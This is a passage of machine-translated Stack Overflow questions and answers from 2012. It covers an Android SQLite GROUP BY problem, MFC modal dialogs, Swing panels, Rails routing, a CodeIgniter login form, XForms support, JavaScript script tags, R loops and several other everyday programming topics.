        throw new RuntimeException(e);
    }
} 
```

你更倾向哪个？还是有更好的解决方案？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:30:52.490

我可能会委托给另一个构建器类。一个只知道如何创建新列表的小班。它提供了更好的运行时安全性，因为它不依赖于给定类具有默认构造函数的假设。也许对于列表没有那么有用，因为我们应该总是能够创建一个空列表，但对于其他类型的类更重要。

例如。

```
public interface EmptyListBuilder {

    public <E> List<E> newList();

    public static final EmptyListBuilder ARRAY_LIST_BUILDER = 
            new EmptyListBuilder() {

        public <E> List<E> newList() {
            return new ArrayList<E>();
        }
    };
} 
```

如静态字段所示，您还可以为一些标准类提供默认实现。

像这样使用类：

```
<T> List<T> readList(EmptyListBuilder builder) {
    List<T> list = builder.newList();
    // read in elements
    return list;
} 
```

您无法确切知道您拥有哪种类型的列表，但这是一个问题，那么听起来您正在尝试做一些有点奇怪的事情。

# android - 光标返回错误值 - sqlite - Android

> ID：13916210
> 
> 赞同：2
> 
> 时间：2012-12-17T14:40:09.167
> 
> 标签：android, sql, sqlite, cursor

我正在开发一个短信应用程序，我试图从每个对话中获取最后一条短信。

这是我的 SQL 语句：

`SELECT MAX(smsTIMESTAMP) AS smsTIMESTAMP,_id, smsID, smsCONID, smsMSG, smsNUM, smsREAD, smsTYPE, smsSHORTMSG, COUNT(*) AS smsNUMMESSAGES FROM sms GROUP BY smsCONID ORDER BY smsTIMESTAMP desc`

我在 SQLite Expert 中运行了查询，得到了正确的响应：

![在此处输入图像描述](../Images/8850512dabbcd271886a5d1fa47a4c6d.png)

但是，当我在我的应用程序中运行它时，我得到：

![在此处输入图像描述](../Images/afadf2ad9ada6f0a57e34e90e1877ac5.png)

这是我的桌子

![在此处输入图像描述](../Images/3520b2426c7bacefda7c78c9fc96713c.png)

这是我的数据操纵器类：

```
public class DataManipulator {
    private static final  String DATABASE_NAME = "smsapplication.db";
    private static final int DATABASE_VERSION = 3;
    static final String TABLE_NAME = "sms";
    private static Context context;
    static SQLiteDatabase db;
    private static DataManipulator instance;

    private SQLiteStatement insertStmt;

    private static final String INSERT = "insert or ignore into "
        + TABLE_NAME + " (smsID, smsCONID, smsMSG, smsNUM, smsREAD, smsTIMESTAMP, smsTYPE, smsSHORTMSG) values (?,?,?,?,?,?,?,?)";

    public DataManipulator(Context context) {
        DataManipulator.context = context;
        OpenHelper openHelper = new OpenHelper(DataManipulator.context);
        DataManipulator.db = openHelper.getWritableDatabase();
        this.insertStmt = DataManipulator.db.compileStatement(INSERT);
    }
    public static DataManipulator getInstance(Context mContext)
    {
        if(instance == null)
        {
            instance = new DataManipulator(mContext);
        }
        return instance;
    }
    public long insert(int smsID, int smsCONID, String smsMSG,
            String smsNUM, int smsREAD, long smsTIMESTAMP, String smsTYPE, String smsSHORTMSG) {
        this.insertStmt.bindLong(1, smsID);
        this.insertStmt.bindLong(2, smsCONID);
        this.insertStmt.bindString(3, smsMSG);
        this.insertStmt.bindString(4, smsNUM);
        this.insertStmt.bindLong(5, smsREAD);
        this.insertStmt.bindString(6, String.valueOf(smsTIMESTAMP));
        this.insertStmt.bindString(7, smsTYPE);
        this.insertStmt.bindString(8, smsSHORTMSG);
        return this.insertStmt.executeInsert();
    }

    public void deleteAll() {
        db.delete(TABLE_NAME, null, null);
    }

    public Cursor getLastSmsForAllConversations()
    {
        Cursor cursor = db.query(TABLE_NAME, new String[] {"_id"," MAX(smsTIMESTAMP) AS smsTIMESTAMP ", "smsCONID", "smsNUM", "smsREAD", "smsTYPE","smsSHORTMSG","COUNT(*) AS smsNUMMESSAGES"  },
                null, null, "smsCONID", null, "smsTIMESTAMP desc"); 
        return cursor;
    }
    public Cursor getConversationMessages(int conID)
    {
        Cursor cursor = db.query(TABLE_NAME, new String[] {"_id", "smsID", "smsCONID", "smsMSG", "smsNUM", "smsREAD", "smsTIMESTAMP", "smsTYPE","smsSHORTMSG"  },
                "smsCONID="+conID, null, null, null, "smsTIMESTAMP asc"); 
        return cursor;
    }
    public void printCursor()
    {
        Cursor cursor = db.rawQuery("SELECT MAX(smsTIMESTAMP) AS smsTIMESTAMP,_id, smsID, smsCONID, smsMSG, smsNUM, smsREAD, smsTYPE, smsSHORTMSG, COUNT(*) AS smsNUMMESSAGES FROM sms GROUP BY smsCONID ORDER BY smsTIMESTAMP desc", null);

            //  db.query(TABLE_NAME, new String[] {"_id","smsTIMESTAMP AS smsTIMESTAMP ", "smsCONID", "smsNUM", "smsREAD", "smsTYPE","smsSHORTMSG"  },"smsCONID=40", null, null, null, "smsTIMESTAMP desc");  
        if (cursor.moveToFirst()){
               do{
                  String data ="";
                  data= cursor.getString(cursor.getColumnIndex("smsTIMESTAMP"))+" - " +cursor.getString(cursor.getColumnIndex("smsSHORTMSG"));
                  Log.i("data", data);
               }while(cursor.moveToNext()); 
            }
            cursor.close();
    }

    private static class OpenHelper extends SQLiteOpenHelper {

        OpenHelper(Context context) {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE " + TABLE_NAME + " (_id INTEGER , smsID INTEGER PRIMARY KEY, smsCONID INTEGER, smsMSG TEXT,smsNUM TEXT, smsREAD INTEGER, smsTIMESTAMP INTEGER, smsTYPE TEXT, smsSHORTMSG TEXT)");
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_NAME);
            onCreate(db);
        }
         @Override
            public synchronized void close() {

            if (db != null)
                db.close();

            super.close();

            }
    } 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T11:20:29.427

使用时`GROUP BY`，结果的每一行对应原始表的多行。如何计算这些结果有三种可能性：

*   具有聚合函数的列类似于`MAX`或`COUNT`计算组中所有行的值；
*   出现在`GROUP BY`子句中的列仅取自组中的*任何*记录（因为组中的所有记录对该列具有相同的值）；
*   其他列是一个问题，因为组中的行可能具有不同的值。在标准 SQL 中，此类列是被禁止的；SQLite 允许它们，但只是为您提供组中任何随机行的值，这几乎不是您想要的。从 SQLite 3.7.11 开始，您可以从匹配 a`MIN`或`MAX`;的行中获取值。这是您在 SQLite Exprert 中看到的，但不是在具有较旧 SQLite 的 Android 上。

* * *

要解决您的问题，您必须首先使用 a`GROUP BY`来获取足够的信息来识别您想要的记录：

```
SELECT smsCONID,                            -- OK: used in GROUP BY
       MAX(smsTIMESTAMP) AS smsTIMESTAMP,   -- OK: aggregate MAX
       COUNT(*) AS smsNUMMESSAGES           -- OK: aggregate COUNT
FROM sms
GROUP BY smsCONID
ORDER BY smsTIMESTAMP DESC 
```

然后，将该结果表与原始`sms`表连接以获取这些记录的其他列：

```
SELECT *
FROM (SELECT smsCONID,
             MAX(smsTIMESTAMP) AS smsTIMESTAMP,
             COUNT(*) AS smsNUMMESSAGES
      FROM sms
      GROUP BY smsCONID) AS grouped
     JOIN sms
       ON grouped.smsCONID     = sms.smsCONID
      AND grouped.smsTIMESTAMP = sms.smsTIMESTAMP
ORDER BY smsTIMESTAMP DESC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:08:26.623

您的查询和代码是正确的我没有发现任何问题而不是上面的查询试试这个..

**选择_id，smsID，smsCONID，smsMSG，smsNUM，smsREAD，smsTYPE，smsSHORTMSG，从sms GROUP BY smsCONID ORDER BY smsTIMESTAMP desc LIMIT 1**

如果你也想计数然后这样做..

SELECT COUNT(*) AS smsNUMMESSAGES, _id, smsID, smsCONID, smsMSG, smsNUM, smsREAD, smsTYPE, smsSHORTMSG, FROM sms GROUP BY smsCONID ORDER BY smsTIMESTAMP desc LIMIT 1

# c++ - 按确定后 MFC 对话框继续

> ID：13916213
> 
> 赞同：0
> 
> 时间：2012-12-17T14:40:18.390
> 
> 标签：c++, mfc, dialog

`edit control`我有一个自定义对话框消息框，当我的主对话框中的数据错误时弹出。

```
CDlgError dlgError = new CDlgError(this);
dlgError.Create(CDlgError::IDD, this);
dlgError.m_staticMessage.SetWindowTextA("Error message!");
dlgError.ShowWindow(SW_SHOW);

//more code 
```

`OK button`我希望仅在我在`CDlgError`弹出对话框中按 an 后才执行其余代码。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:42:52.780

使用`DoModal`代替`Create`and`ShowWindow`来显示您的错误对话框。例如

```
CDlgError dlgError = new CDlgError(this);
dlgError.m_strMessage = "Error message!";
dlgError.DoModal(); 
```

正如您从代码中看到的那样，您需要传入文本，然后在其中设置您的消息标签，`CDlgError::OnInitDialog`因为在进入模态之前控件不会被初始化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-18T11:39:54.770

您正在创建一个`Create`显示无**模式**对话框的对话框（即使对话框打开，您也可以单击应用程序的其他部分）。您的要求是**模态**对话框，在此对话框关闭之前，您无法单击应用程序的任何部分。为此，请使用`DoModal`函数而不是创建。

# java - 如何在 JPanel 中添加一个类？

> ID：13916215
> 
> 赞同：-5
> 
> 时间：2012-12-17T14:40:24.707
> 
> 标签：java, swing, class, jpanel

这是JPanel

```
public class DisplayBoard {

  public static void main (String[] args) {

    JFrame frame = new JFrame();
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    //The main panel
    JPanel main = new JPanel();
    main.setPreferredSize(new Dimension(600,800) );
    main.setLayout(new BorderLayout());

    //The title panel
    JPanel title = new JPanel();
    title.setPreferredSize(new Dimension(400, 120));
    title.setBackground(Color.YELLOW);
    JLabel test1 = new JLabel("Title goes here");
    title.add(test1);

    //The side bar panel
    JPanel sidebar = new JPanel();
    sidebar.setPreferredSize(new Dimension(200, 800));
    sidebar.add(AddSubtract);
    sidebar.setBackground(Color.GREEN);
    JLabel test2 = new JLabel("Sidebar goes here");
    sidebar.add(test2);

    //The panel that displays all the cards
    JPanel cardBoard = new JPanel();
    cardBoard.setPreferredSize(new Dimension(400,640) );

    //adding panels to the main panel
    main.add(cardBoard, BorderLayout.CENTER);
    main.add(title, BorderLayout.NORTH);
    main.add(sidebar, BorderLayout.WEST);

    frame.setContentPane(main);
    frame.pack();
    frame.setVisible(true);

  }
} 
```

我想将这个类添加到侧边栏面板中

```
public class AddSubtract {

int Number = 0;
private JFrame Frame = new JFrame("Math");
private JPanel ContentPane = new JPanel();
private JButton Button1 = new JButton("Add");
private JButton Button2 = new JButton("Subtract");
private JLabel Num = new JLabel ("Number: " + Integer.toString (Number));

public AddSubtract() {

    Frame.setContentPane(ContentPane);
    ContentPane.add(Button1);
    ContentPane.add(Button2);
    ContentPane.add(Num);
    Button1.addActionListener(new Adding());
    Button2.addActionListener(new Subtracting());
}

public class Adding implements ActionListener {
    public void actionPerformed(ActionEvent e) {
        Number++;
        Num.setText ("Number: " + Integer.toString (Number));
    }
}

public class Subtracting implements ActionListener {
    public void actionPerformed(ActionEvent e) {
        Number--;
        Num.setText ("Number: " + Integer.toString (Number));
    }
}

public void launchFrame(){
    Frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    Frame.pack();
    Frame.setVisible(true);
}

public static void main(String args[]){
    AddSubtract Test = new AddSubtract();
    Test.launchFrame();
    }
} 
```

有人可以向我解释我该怎么做吗？我有一种感觉，这是行不通的，但我真的很想学习如何做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:57:31.730

这肯定行不通。对于初学者，您有两种`main()`方法。其次，如果你想给你的 Frame 添加一个类，它应该从`JComponent`. 基本上，您的代码应如下所示：

```
public class MainFrame extends JFrame {
    public MainFrame() {
        this.add(new MainPanel())
        //insert all settings here.
    }
}

public class MainPanel extends JPanel {
    public MainPanel() {
        this.add(new AddSubtract());
        this.add(/*more panels*/)
    }
}

public class AddSubtract extends JPanel {
    public AddSubtract() {
        //add buttons and stuff here
    }
} 
```

并且变量不以大写字母开头。

编辑：当你有一些 JFrame 时，通常最好有一个`main()`只有一行的方法：

```
public static void main(String[] args) {
    new MainFrame();
} 
```

只需在构造函数中设置设置和配置`JFrame`。

# ruby-on-rails - 什么时候应该在 Rails 中创建命名路由？

> ID：13916217
> 
> 赞同：1
> 
> 时间：2012-12-17T14:40:28.763
> 
> 标签：ruby-on-rails, rails-routing

我对 Rails 3 资源路线感到困惑。我有以下行`routes.rb`

```
resources :dungeons, only: [ :index, :destroy, :create, :update, :show ] 
```

当我检查使用创建的命名路由时`rake routes`，我得到：

```
dungeons GET    /dungeons(.:format)                                    dungeons#index
         POST   /dungeons(.:format)                                    dungeons#create
 dungeon GET    /dungeons/:id(.:format)                                dungeons#show
         PUT    /dungeons/:id(.:format)                                dungeons#update
         DELETE /dungeons/:id(.:format)                                dungeons#destroy 
```

为什么使用 http get 方法的路由只有命名路由？如果我想创建一个指向销毁操作的链接，我必须使用类似的东西`{ :action => 'destroy', :method => :delete, :id => dungeon.id }`而不是简单的`destroy_dungeon_path( dungeon )`. 我的有什么问题`routes.rb`吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T14:45:13.660

您的路线文件没有问题。这是销毁路线：`dungeon_path(id)`

您必须发送 DELETE 请求才能触发它。show、update 和 destroy 得到相同的 named_route，唯一不同的是 Request 的类型（GET 表示 show，PUT 表示 update 或 DELETE 表示 destroy）

您需要了解 Rails3 中路由的所有内容：http: [//guides.rubyonrails.org/routing.html](http://guides.rubyonrails.org/routing.html)

# php - CodeIgniter 2.1.3 - 表单助手 - 无法提交数据

> ID：13916220
> 
> 赞同：0
> 
> 时间：2012-12-17T14:40:45.113
> 
> 标签：php, codeigniter, formhelper

我正在做一个简单的表单登录。经过多次失败尝试后，我下载了一个示例以了解它是如何工作的。问题是：在我的登录表单中提交数据并调用控制器后，我无法获取控制器中提交的数据。

我尝试了一些简单的方法，比如打印用户名，但我什么也没得到。

我做错了什么？我应该配置一些东西吗？

另一个问题是：当我用普通的 HTML 表单编写表单时，表单效果很好。

我使用了在这里找到的代码[http://www.codefactorycr.com/login-with-codeigniter-php.html](http://www.codefactorycr.com/login-with-codeigniter-php.html)

我已经使用了另一个代码和我自己的代码，但是 atm 我正在尝试一切以了解正在发生的事情。

login_view.php

```
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
<title>Simple Login with CodeIgniter</title>
  </head>
  <body>
    <h1>Simple Login with CodeIgniter</h1>
    <?php echo validation_errors(); ?>
    <?php echo form_open('verifylogin'); ?>
      <label for="username">Username:</label>
      <input type="text" size="20" id="username" name="username"/>
      <br/>
      <label for="password">Password:</label>
      <input type="password" size="20" id="passowrd" name="password"/>
      <br/>
      <input type="submit" value="Login"/>
    </form>
  </body>
</html> 
```

验证登录.php

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class VerifyLogin extends CI_Controller {

  function __construct()
  {
    parent::__construct();
    $this->load->model('user','',TRUE);
  }

  function index()
  {

  $username = $this->input->post('username');

  echo "Username: " . $username;
    //This method will have the credentials validation
    $this->load->library('Form_validation');

    $this->form_validation->set_rules('username', 'Username', 'trim|required|xss_clean');
    $this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean|callback_check_database');

if($this->form_validation->run() == FALSE)
{

  //Field validation failed.  User redirected to login page
      $this->load->view('login_view');
    }
    else
    {
      //Go to private area
      redirect('home', 'refresh');
    }

  }

  function check_database($password)
  {
    //Field validation succeeded.  Validate against database
    $username = $this->input->post('username');

    //query the database
    $result = $this->user->login($username, $password);

    if($result)
    {
      $sess_array = array();
      foreach($result as $row)
      {
        $sess_array = array(
          'id' => $row->id,
          'username' => $row->username
        );
        $this->session->set_userdata('logged_in', $sess_array);
      }
      return TRUE;
    }
    else
    {
      $this->form_validation->set_message('check_database', 'Invalid username or password');
      return false;
    }
  }
}
?> 
```

我什至不能写这个用户名

```
$username = $this->input->post('username');

echo "Username: " . $username; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:36:41.887

I also use form helper and its working fine

```
<?php echo validation_errors(); ?>
<?php echo form_open('admin/varifylogin'); ?>
<table>
    <tr>
        <td>UserName</td>
        <td><?php echo form_input('username',$this->input->post('usernamee'));?></td>
    </tr>
    <tr>
        <td>Password</td>
        <td><?php echo form_password('password');?></td>
    </tr>
    <tr>
        <td colspan="2"><?php echo form_submit('login','Sign In');?></td>
    </tr>
</table>
<?php echo form_close(); ?> 
```

# javascript - 使用不受信任的证书对安全 URL 执行 AJAX 方法

> ID：13916230
> 
> 赞同：0
> 
> 时间：2012-12-17T14:41:10.743
> 
> 标签：javascript, jquery, html, ssl, https

我有一个站点，它使 AJAX JSONP 调用安全 (SSL) Web 服务器。如果我使用不安全的 (HTTP) Web 服务器，一切正常，但是当我更改为 SSL 版本时，调用永远不会返回。我已经检查了提琴手，错误如下：

由于 RemoteCertificateChainErrors，远程服务器 (192.168.150.85) 提供了未验证的证书。

这意味着缺少一些中间证书，但我不知道是哪一个。无论如何，我需要处理某些安装具有无效证书凭据的情况。

众所周知，如果您尝试对具有不受信任或过期证书的安全 URL 执行 AJAX 方法，浏览器将警告您的用户，无论您尝试如何或尝试做什么。在浏览器中您可以接受风险，即使在 C# 中您也可以实现回调来接受这些风险。但我不知道如何在 Javascript/JQuery 中做到这一点。

有人知道如何处理这种情况吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-16T15:14:03.313

似乎这是不可能的/推荐的。这确实不是一个好主意。我们现在使用非常便宜的真实证书（甚至还有免费的）并且在我们的测试环境中更容易管理，我们有多个移动设备、客户端类型等等。

# jquery - jQuery 的对话框破坏了 Chrome 的 CSS

> ID：13916231
> 
> 赞同：0
> 
> 时间：2012-12-17T14:41:10.730
> 
> 标签：jquery, css, google-chrome

我有以下问题。当我激活一个非常大的对话框窗口（大约 400 像素高）时，当我在 Chrome 中关闭它时，浏览器会显示垂直滚动，并在窗口底部找到一个新的“白色”栏（即，就好像内容没有身体的高度一样长）。问题是我检查了，正文的高度没有改变，内容的高度没有改变......如果我右键单击某处以显示 ContextMenu，或者将鼠标悬停在 CSS 上，这个问题就会消失下拉式菜单。

这曾经发生在任何人身上吗？知道为什么会发生吗？我发现，如果我将对话框的顶部属性更改为 0（将其放在屏幕顶部而不是中间），当我关闭它时，我不会看到此故障发生。

谢谢

# ssis - ssis 2008，从excel中删除内容

> ID：13916232
> 
> 赞同：0
> 
> 时间：2012-12-17T14:41:13.897
> 
> 标签：ssis

我将 SSIS 用于 SQL Server 2008。

我的 SSIS 包从 sql 中获取数据并将其导出到 excel 文件中。但每次这样做时，我都希望在 excel 上有新数据。

现在的问题是，如果我多次执行包，我将在 excel 文件中拥有旧数据和新数据。我只希望显示新数据。

在 SSIS 上，在控制流选项卡上，我有一个数据流任务。在数据流选项卡上，我有一个 OLEDB 源和一个 Excel 目标，以便将数据放在 Excel 上。

所以我想在每次将数据插入到excel之前从SSIS上的excel中删除内容。

excel 文件有一个图像、一个标题和列名。我希望保留这些数据。

但我希望删除行中的数据。

我怎样才能做到这一点？

谢谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T20:22:41.990

好的。我所做的是复制文件并将数据加载到新文件上，每次 ssis 加载它都会覆盖文件，所以我总是有新数据............谢谢！

# xhtml - 不显示 XFORMS 控件的浏览器

> ID：13916234
> 
> 赞同：3
> 
> 时间：2012-12-17T14:41:19.237
> 
> 标签：xhtml, xforms

我正在学习 XForms。我正在尝试在 IE9、Chrome 和 Firefox 14 等浏览器中显示此内容。

```
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:xf="http://www.w3.org/2002/xforms">
   <head>
      <title>Hello World in XForms</title>
      <xf:model>
         <xf:instance xmlns="">
            <data>
               <PersonGivenName/>
            </data>
         </xf:instance>
      </xf:model>
   </head>
   <body>
      <p>Type your first name in the input box. <br/>
        If you are running XForms, the output should be displayed in the output area.</p>   
         <xf:input ref="PersonGivenName" incremental="true">
            <xf:label>Please enter your first name: </xf:label>
         </xf:input>
         <br />
         <xf:output value="concat('Hello ', PersonGivenName, '. We hope you like XForms!')">
            <xf:label>Output: </xf:label>
         </xf:output>
   </body>
</html> 
```

但是文本框没有出现。问题是什么？我曾尝试在 Xfroms 插件中搜索浏览器，但一无所获。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:50:56.653

浏览器本身不支持 XForms，但有客户端实现，例如 XSLTForms（基于 XSLT 和 Javascript）。

-阿兰

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-17T17:08:27.310

正如 Alain Couthures 已经指出的那样，目前在浏览器中没有对 XForms 的原生支持（而且显然未来也没有前景）。您将需要安装 XForms 的客户端或服务器端实现，然后您应该开始看到结果。

可用的客户端实现包括

*   [XSLTForms](http://www.agencexml.com/xsltforms.htm)（由 Alain Couthures 编写，由于设置简单而经常使用）
*   [Ubiquity XForms](http://code.google.com/p/ubiquity-xforms/)（一个正在进行的项目，主要由 Mark Birbeck 进行；被广泛认为很有前途，但我上次查看时没有很好的文档记录）
*   [EMC Documentum XForms 引擎，又名 Formula](https://community.emc.com/docs/DOC-4345)（看起来非常精致；文档针对将其与其他 EMC 产品集成的人员）

突出的服务器端实现包括

*   [Orbeon](http://www.orbeon.com/)（也许是所有 XForms 产品中文档最好的）
*   [BetterFORM](http://www.betterform.de/en/index.html)（千叶项目的继承者）

其中一些具有活跃的用户社区邮件列表。

还有一些非基于浏览器的实现使用 HTML 以外的语言作为主文档语言（IBM Forms 和 Open Office）。

# javascript - iframe.scrollTo() 不适用于 iPad 上的 Excel/PowerPoint 文档

> ID：13916236
> 
> 赞同：0
> 
> 时间：2012-12-17T14:41:20.860
> 
> 标签：javascript, html, ios, iframe

我想为 iPad 实现 iframe 内容的自定义滚动。我的解决方案如下。我有 iframe：

```
<div id="scroller" style="height: 300px; width: 100%; overflow: auto;">
    <iframe height="100%" id="iframe" width="100%" name="iframe" src="1.pdf" />
</div> 
```

在我使用的javascript代码中：

```
top.frames['iframe'].scrollTo(x,y); 
```

它适用于 pdf 文档，但不适用于 Excel 和 Power Point 文档。

有没有人有什么建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-26T12:36:52.003

在 iframe 中直接/正确地显示 worddocument 或 excel 是不可能的。您可以使用 Google 文档查看器/驱动器来展示文档。

检查[http://docs.google.com/viewer](http://docs.google.com/viewer)和[https://drive.google.com/](https://drive.google.com/)

但如果可能的话，我会坚持使用PDF

# javascript - 折叠/展开脚本不起作用

> ID：13916238
> 
> 赞同：3
> 
> 时间：2012-12-17T14:41:23.303
> 
> 标签：javascript, function, onclick

我对 Javascript 编码没有经验。不过，我愿意学习。

我遇到了一些创建折叠/展开`<div>`块的教程。我已经用 jsfiddle 测试了代码。你可以在[这里查看代码](http://jsfiddle.net/Evs2f/31/)

它工作正常，忽略样式。但是我无法弄清楚为什么代码在实时网站上不起作用。

起初，我在 WordPress 页面编辑器中插入了所有代码 javascript 和 HTML。然后，我在标题中移动了 javascript。我看到了一些关于代码来源的东西。我不确定哪个是来源。

这是插入到 header.php 中的 javascript 代码：

```
<script type="text/javascript" language="javascript" src="http://example.com/wp-content/themes/crimson/scripts/jquery.min.js">
function toggle2(showHideDiv, switchTextDiv) {
    var ele = document.getElementById(showHideDiv);
    var text = document.getElementById(switchTextDiv);
    if (ele.style.display == "block") {
        ele.style.display = "none";
        text.innerHTML = "expand";
    }
    else {
        ele.style.display = "block";
        text.innerHTML = "collapse";
    }
}

function toggle3(contentDiv, controlDiv) {
    if (contentDiv.constructor == Array) {
        for (i = 0; i < contentDiv.length; i++) {
            toggle2(contentDiv[i], controlDiv[i]);
        }
    }
    else {
        toggle2(contentDiv, controlDiv);
    }
}​
</script>​​​​​​​​​​​​​​​​ 
```

[HTML 代码与小提琴](http://jsfiddle.net/Evs2f/31/)HTML 面板上的相同，它显示在 WordPress 页面中。

请告诉我这段代码有什么问题？它是javascript代码的来源吗？

Chrome 控制台为我提供以下信息：

> 未捕获的 ReferenceError：toggle2 未定义 example.com:103 onclick

最大的问题是为什么代码在 jsfiddle 上运行良好，无论是在 mootools 还是 jquery 框架上，但它在实时站点上不起作用？

更新：我已经更新了脚本标签。还是不行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:44:31.633

您需要将您的 Javascript 代码放在它自己的标签中。

```
 <script type="text/javascript" language="javascript" src="http://example.com/wp-content/themes/crimson/scripts/jquery.min.js">
  <script type="text/javascript">

       YOUR CODE HERE

  </script> 
```

此外，由于您使用的是 jQuery，因此您需要像这样使用 ready() 函数：

```
 $(function(){
             YOUR CODE HERE
       }); 
```

* * *

```
 <a href="#" id="clickme">Click</a>  
  <div id="d1">Some content to hide</div> 
```

在头上：

```
 <script type="text/javascript">
       $(document).ready(function(){
           $("#clickme").toggle(function(){
               $("#d1").show();
           },
             function(){
                $("#d1").hide();
             }
           );
       });
  </script> 
```

当然，在代码中保留对 jQuery 的引用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:49:13.543

你有一些问题：

*   重叠的脚本标签
*   您在 Jsfiddle 中使用 Mootools，在此示例中使用 jQuery
*   您包括 jquery，然后用纯 Javascript 制作动画

试试这个，更正脚本标签：

```
<script type="text/javascript" language="javascript" src="http://example.com/wp-content/themes/crimson/scripts/jquery.min.js"></script>
<script type="text/javascript">
function toggle2(showHideDiv, switchTextDiv) {
    var ele = document.getElementById(showHideDiv);
    var text = document.getElementById(switchTextDiv);
    if (ele.style.display == "block") {
        ele.style.display = "none";
        text.innerHTML = "expand";
    }
    else {
        ele.style.display = "block";
        text.innerHTML = "collapse";
    }
}

function toggle3(contentDiv, controlDiv) {
    if (contentDiv.constructor == Array) {
        for (i = 0; i < contentDiv.length; i++) {
            toggle2(contentDiv[i], controlDiv[i]);
        }
    }
    else {
        toggle2(contentDiv, controlDiv);
    }
}​
</script> 
```

# r - For 循环遍历唯一值

> ID：13916240
> 
> 赞同：15
> 
> 时间：2012-12-17T14:41:32.573
> 
> 标签：r

是否可以编写具有离散级别的 for 循环？

我有以下形式的向量：

```
a<-c(1,1,1,1,1,3,3,5,11,18 ....1350) 
```

它是一个递增的序列，但不遵循任何逻辑顺序；

我想使用levels(a)作为参数运行一个for循环：

```
for i in 1:levels(a) 
```

我收到以下错误：

```
In 1:levels_id :
 numerical expression has 1350 elements: only the first used 
```

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-12-17T14:47:37.193

您最初的错误是您将循环索引与循环矢量元素混淆了。

如果您想遍历向量的唯一元素，请使用：

```
for(i in unique(a)) 
```

我想这就是你想要做的。但另一种方法是循环遍历唯一向量的索引：

```
for(i in 1:length(unique(a))){
    this.a <- unique(a)[i]
} 
```

这两个是等价的，但是第二个也可以让你知道当前的索引（如果你需要的话）。

# actionscript-3 - AS3 - 使用附加文件的 NativeProcess

> ID：13916253
> 
> 赞同：0
> 
> 时间：2012-12-17T14:42:15.210
> 
> 标签：actionscript-3, process, air

所以我有一个运行简单命令行程序的 AIR 应用程序。该程序基本上接收一个文件，解压缩并输出结果。我可以给它的唯一参数是输入文件，它会自动将结果输出到它所在的文件夹中。当然，我正在使用`NativeProcess`该类运行程序，而该类又需要一个`NativeProcessStartupInfo`对象来启动。

反正`NativeProcessStartupInfo`'s`workingDirectory`属性设置为我要放入程序的文件所在的文件夹，这样解压后的结果就放入那个文件夹。然而，问题是该程序需要一个附加文件（.dat）在与它运行相同的目录中。这意味着无论在哪里`workingDirectory`，.dat 也需要在那里。

目前，我正在复制 .dat 并在解压完成后将其删除。我想知道是否有更好的方法来做到这一点？是否有我不知道的价值`NativeProcess`或可以提供帮助？`NativeProcessStartupInfo`

# e-commerce - AbanteCart 语言定义 API updateDescriptions vs replaceDescriptions

> ID：13916257
> 
> 赞同：0
> 
> 时间：2012-12-17T14:42:22.917
> 
> 标签：e-commerce

我正在为新的 AbanteCart 版本 1.1.3 进行扩展

语言的新 API 有 updateDescriptions 和 replaceDescriptions

我看到这段代码 `$this->language->replaceDescriptions('banner_descriptions', array('banner_id' => (int)$banner_id), array($language_id => $update) );`

我不清楚有什么区别以及何时使用更新与替换

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T10:08:42.323

replaceDescriptions 方法检查所选语言的语言描述是否已存在于数据库中。updateDescriptions 方法只是进行更新。当您使用它时，请确保存在语言描述。

# ruby-on-rails - Rails 3 多个 default_scope 字母数字

> ID：13916264
> 
> 赞同：0
> 
> 时间：2012-12-17T14:42:48.903
> 
> 标签：ruby-on-rails, default-scope

我的表中有一列是代码。它们的格式为 `AAA-XXXX-YYY`where

*   `AAA`是按字母顺序排列的
*   `XXX`是数字
*   `YYY`是数字

我想对我的 default_scope 使用字母排序`AAA`，然后是数字排序`XXXX`，然后是数字排序，`YYY`所以当我索引它们时，它们会像这样排序。

如果我对列进行字母数字排序，我将得到以下结果：

```
AAA-1000-1
AAA-1000-111
AAA-1000-2
BB-1000-12
BBB-1000-1
BCA-1000-1
C-1000-12 
```

但 111 大于 2 使用数字排序。

编辑：AAA 的长度不固定。所以它可能是“AA”或“BBBB”或“CCC”。已经提到使用 SQL SUBSTRING，但位置并不总是设置。

EDIT2：我可能应该提到这种排序需要在 default_scope 上完成，所以当我访问 Object.all 时，它们默认以这种方式排序。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T11:42:49.770

```
arr = ['AAA-1000-1','AAA-1000-111','AAA-1000-2','E-3-3','E-2-3','CCCC-2-45']

arr.sort_by {|elm| "%10s%10i%10i" % elm.split('-') }

=> ["E-2-3", "E-3-3", "AAA-1000-1", "AAA-1000-2", "AAA-1000-111", "CCCC-2-45"] 
```

# c# - 使用 Nest 客户端的弹性搜索中的动态构面

> ID：13916265
> 
> 赞同：1
> 
> 时间：2012-12-17T14:42:49.607
> 
